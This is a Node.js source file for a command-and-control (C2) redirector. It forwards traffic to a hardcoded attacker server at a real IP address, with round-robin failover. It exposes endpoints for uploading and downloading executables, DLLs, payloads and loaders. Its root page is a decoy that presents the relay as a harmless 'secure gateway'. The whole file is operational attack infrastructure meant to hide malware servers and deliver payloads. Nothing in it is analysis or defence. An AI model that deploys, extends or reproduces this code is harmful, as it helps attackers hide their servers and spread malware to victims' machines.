const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 10000; // Default to Render's standard port if not specified

// List of target C2 URLs for dynamic selection (can be overridden by environment variable)
const TARGET_C2_URLS = process.env.TARGET_C2_URLS ? process.env.TARGET_C2_URLS.split(',') : [
  'http://31.57.147.77:6464'
  // Add more fallback URLs here if needed
];

// Function to select a target URL (simple rotation or random selection)
let currentTargetIndex = 0;
function getCurrentTargetUrl() {
  // Validate the list of target URLs
  if (!TARGET_C2_URLS || TARGET_C2_URLS.length === 0) {
    console.error('[Target URL Error] No target URLs defined. Using fallback.');
    return 'http://31.57.147.77:6464';
  }
  const targetUrl = TARGET_C2_URLS[currentTargetIndex];
  // Rotate to next target for the next request (simple round-robin)
  currentTargetIndex = (currentTargetIndex + 1) % TARGET_C2_URLS.length;
  // Validate the selected target URL
  if (!targetUrl || typeof targetUrl !== 'string' || !targetUrl.startsWith('http')) {
    console.error(`[Target URL Error] Invalid target URL: ${targetUrl}. Using fallback.`);
    return 'http://31.57.147.77:6464';
  }
  console.log(`[Target URL] Selected target URL: ${targetUrl}`);
  return targetUrl;
}

// Use Helmet to add security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  }
}));

// Add CORS headers to allow cross-origin requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  next();
});

// Middleware to log request body size for uploads (avoid logging full body to prevent large output)
app.use(express.raw({ type: '*/*', limit: '10mb' })); // Parse raw body for uploads
app.use((req, res, next) => {
  console.log(`[Global] Incoming request: ${req.method} ${req.url}`);
  console.log(`[Global] Headers: ${JSON.stringify(req.headers, null, 2)}`);
  if (req.body && Buffer.isBuffer(req.body)) {
    console.log(`[Global] Request body size: ${req.body.length} bytes`);
  } else if (req.body) {
    console.log(`[Global] Request body type: ${typeof req.body}`);
  }
  next();
});

// Proxy middleware for /c2 endpoints
app.use('/c2', createProxyMiddleware({
  target: () => getCurrentTargetUrl(), // Dynamically select target URL
  changeOrigin: true,
  pathRewrite: {
    '^/c2': '' // Remove /c2 prefix when forwarding to target
  },
  onProxyReq: (proxyReq, req, res) => {
    // Detailed logging of incoming request
    console.log(`[C2 Proxy] Proxying request: ${req.method} ${req.url}`);
    console.log(`[C2 Proxy] Target backend: ${proxyReq.getHeader('host')}${proxyReq.path}`);
    if (req.body && Buffer.isBuffer(req.body)) {
      console.log(`[C2 Proxy] Forwarding body of size: ${req.body.length} bytes`);
      proxyReq.write(req.body); // Ensure body is forwarded for uploads
      proxyReq.end();
    }
  },
  onProxyRes: (proxyRes, req, res) => {
    // Log proxy response status and headers
    console.log(`[C2 Proxy] Proxy response for ${req.url}: Status ${proxyRes.statusCode}`);
    console.log(`[C2 Proxy] Response headers: ${JSON.stringify(proxyRes.headers, null, 2)}`);
  },
  onError: (err, req, res, target) => {
    console.error(`[C2 Proxy] Proxy error with target ${target} for ${req.url}:`, err);
    res.status(503).send('Service Unavailable');
  }
}));

// Proxy middleware for direct C2 endpoints (case-insensitive for uploadexe, uploaddll, etc.)
app.use([
  '/uploadexe', '/Uploadexe', '/UPLOADEXE',
  '/uploaddll', '/Uploaddll', '/UPLOADDLL',
  '/uploadpayload', '/Uploadpayload', '/UPLOADPAYLOAD',
  '/uploadloader', '/Uploadloader', '/UPLOADLOADER',
  '/getexe', '/Getexe', '/GETEXE',
  '/getdll', '/Getdll', '/GETDLL',
  '/getpayload', '/Getpayload', '/GETPAYLOAD'
], createProxyMiddleware({
  target: () => getCurrentTargetUrl(), // Dynamically select target URL
  changeOrigin: true,
  pathRewrite: (path, req) => {
    // Convert path to lowercase to match backend expectation if needed
    return path.toLowerCase();
  },
  onProxyReq: (proxyReq, req, res) => {
    console.log(`[Direct Proxy] Direct endpoint request: ${req.method} ${req.url}`);
    console.log(`[Direct Proxy] Target backend: ${proxyReq.getHeader('host')}${proxyReq.path}`);
    if (req.body && Buffer.isBuffer(req.body)) {
      console.log(`[Direct Proxy] Forwarding body of size: ${req.body.length} bytes`);
      proxyReq.write(req.body); // Ensure body is forwarded for uploads
      proxyReq.end();
    }
  },
  onProxyRes: (proxyRes, req, res) => {
    console.log(`[Direct Proxy] Proxy response for ${req.url}: Status ${proxyRes.statusCode}`);
    console.log(`[Direct Proxy] Response headers: ${JSON.stringify(proxyRes.headers, null, 2)}`);
  },
  onError: (err, req, res, target) => {
    console.error(`[Direct Proxy] Proxy error with target ${target} for ${req.url}:`, err);
    res.status(503).send('Service Unavailable');
  }
}));

// Redirect root to a harmless page
app.get('/', (req, res) => {
  res.status(200).send('<h1>Welcome</h1><p>This is a secure gateway.</p>');
});

// Catch-all for other requests
app.all('*', (req, res) => {
  console.log(`[Catch-All] Unhandled request: ${req.method} ${req.url}`);
  res.status(404).send('Not Found');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`C2 Redirector running on port ${PORT}, proxying to dynamic targets: ${TARGET_C2_URLS.join(', ')}`);
});
